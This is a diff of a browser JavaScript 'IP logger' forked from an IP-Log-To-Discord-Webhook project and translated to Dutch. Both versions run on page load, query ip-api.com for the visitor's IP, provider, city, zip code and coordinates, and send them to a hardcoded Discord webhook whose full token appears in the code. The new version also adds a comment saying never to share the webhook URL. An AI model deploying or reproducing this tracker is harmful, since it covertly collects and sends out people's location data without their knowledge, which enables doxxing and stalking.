@@ -1,57 +1,73 @@
-// Paste your Discord Webhook API URL into Line 3: WEBHOOKURL => YOUR API URL
-
-var webHookUrl = "https://discord.com/api/webhooks/1310562977971175425/DILmHb8nxmmVV0f1vfR4D2yoOcMZL-D1RevuOOSaJVndxL2InKUcQpZSFUCwGRjuwEEY";
+// Vervang WEBHOOKURL door je eigen Discord Webhook URL
+const webHookUrl = "https://discord.com/api/webhooks/1310562977971175425/DILmHb8nxmmVV0f1vfR4D2yoOcMZL-D1RevuOOSaJVndxL2InKUcQpZSFUCwGRjuwEEY";
 
 /*
     Forked from: https://github.com/luisoos/IP-Log-To-Discord-Webhook
     License: MIT
+    ** Let op: Deel je Webhook URL nooit in publieke code! **
 */
 
-const request = async () => { // Calling a "synchronous" fetch
-    const response = await fetch('https://ip-api.com/json/');
-    const data = await response.json();
+const sendToWebhook = async () => {
+    try {
+        // Haal gegevens op van de IP API
+        const response = await fetch('https://ip-api.com/json/');
+        if (!response.ok) throw new Error("IP-API request failed");
+        
+        const data = await response.json();
 
-    // Declaring variables
-    var ip = data.query;
+        // Variabelen instellen
+        const ip = data.query;
+        const provider = `${data.org} (${data.as})`;
+        const timezone = data.timezone;
+        const country = data.country;
+        const countryCode = data.countryCode.toLowerCase();
+        const region = `${data.region} (${data.regionName})`;
+        const city = data.city;
+        const zip = data.zip;
+        const lat = data.lat;
+        const lon = data.lon;
 
-    var provider = data.org + " (" + data.as + ")";
+        // Payload voor de webhook
+        const params = {
+            username: "IP Log",
+            avatar_url: "",
+            content: `
+__**🌐 IP-Address:**__ 
+\`${ip}\`
 
-    var timezone = data.timezone;
-    var country = data.country;
-    var countryCode = data.countryCode.toLowerCase()
-    var region = data.region + " (" + data.regionName + ")";
-    var city = data.city;
+__**📞 Provider:**__ 
+${provider}
 
-    var zip = data.zip;
-    var lat = data.lat;
-    var lon = data.lon;
+__**🗺️ Timezone:**__ 
+${timezone}
 
-    // Open POST Request
-    var postRequest = new XMLHttpRequest();
-    postRequest.open("POST", webHookUrl);
+__**:flag_${countryCode}: Country and Region:**__ 
+${country} - ${region}
 
-    postRequest.setRequestHeader('Content-type', 'application/json');
+__**🏙️ Zip Code & City:**__ 
+${zip} ${city}
 
-    var params = {
-        username:   "IP Log",
-        avatar_url: "",
-        content:    "__**:globe_with_meridians: IP-Adress:**__ \n" 
-                    + "`" + ip + "`" + 
-                    "\n \n__**:telephone: Provider:**__ \n" 
-                    + provider + 
-                    "\n \n__**:map: Timezone:**__ \n" 
-                    + timezone + 
-                    "\n \n__**:flag_" + countryCode + ": Country and Region:**__ \n" 
-                    + country + " - " + region + 
-                    "\n \n__**:cityscape: Zip Code & City:**__ \n" 
-                    + zip + " " + city +
-                    "\n \n__**:round_pushpin: Location:**__ \n" 
-                    + "**Longitude:** " + lon + "\n"
-                    + "**Latitude:** " + lat
+__**📍 Location:**__ 
+**Longitude:** ${lon}
+**Latitude:** ${lat}
+            `
+        };
+
+        // Verstuur gegevens naar de Discord webhook
+        const webhookResponse = await fetch(webHookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(params),
+        });
+
+        if (!webhookResponse.ok) throw new Error("Webhook request failed");
+        console.log("Gegevens succesvol verzonden naar Discord Webhook.");
+    } catch (error) {
+        console.error("Fout opgetreden:", error.message);
     }
+};
 
-    postRequest.send(JSON.stringify(params));
-
-}
-
-request();
+// Voer de functie uit
+sendToWebhook();
